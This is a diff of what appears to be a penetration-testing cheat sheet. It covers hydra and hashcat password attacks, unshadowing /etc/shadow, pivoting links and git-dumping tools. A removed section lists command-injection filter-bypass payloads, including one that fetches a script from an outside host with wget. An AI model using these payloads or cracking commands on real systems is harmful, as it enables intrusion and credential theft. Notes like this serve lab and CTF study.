@@ -70,6 +70,7 @@ unshadow /etc/passwd /etc/shadow > output.db
 
 hydra [-L [userlist.txt] -P [passwordlist.txt]]/[-C [combineduserpassfile]] [IP] http[s]-post-form "/[endpoint]:log=^USER^&pwd=^PASS^[rest of POST body if exist]:F=[error message]"
 -C uses file in [user:pass] format and reduces the number of combinations and reduces bruteforce time, eg. retrieve username passwords from a db
+patato - brute force tool for various protocols incase hydra doesn't work out (legacy issues?)
 
 .\hashcat64.exe -m [mode] hash.txt rockyou.txt -d 1
 ```
@@ -86,24 +87,6 @@ grep -r password . 2>/dev/null [searches for the value 'password' recursively ac
 cut -d "delimiter" -f (field number 1,2 etc.) file.txt
 ```
 
-## Bypass Character Filters
-
-```
-${IFS} - Internal Field Separator, default variable in bash [Alternative to whitespace]
-
-#Curly brace expansion
-0xdf;{ping,-c,1,10.10.14.23};#
-0xdf;ping -c 1 10.10.14.23;#
-
-\r\n -> EOL, similar function to ';'
-%0d : \r [Carriage return]
-%0a : \n
-%09 : \t
-
-#Quotes was also not URL encoded
-password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
-```
-
 ## Pivoting & Port Forwarding
 
 {% embed url="https://github.com/twelvesec/port-forwarding" %}
@@ -114,9 +97,11 @@ password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
 
 {% embed url="https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740" %}
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>eg. port 3306 running on target but no mysql client, access from kali unless sum like mysqldump is there</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>eg. port 3306 running on target but no mysql client, access from kali unless sum like mysqldump is there</p></figcaption></figure>
 
 ## Git
+
+{% embed url="https://github.com/internetwache/GitTools" %}
 
 ```
 https://github.com/arthaud/git-dumper
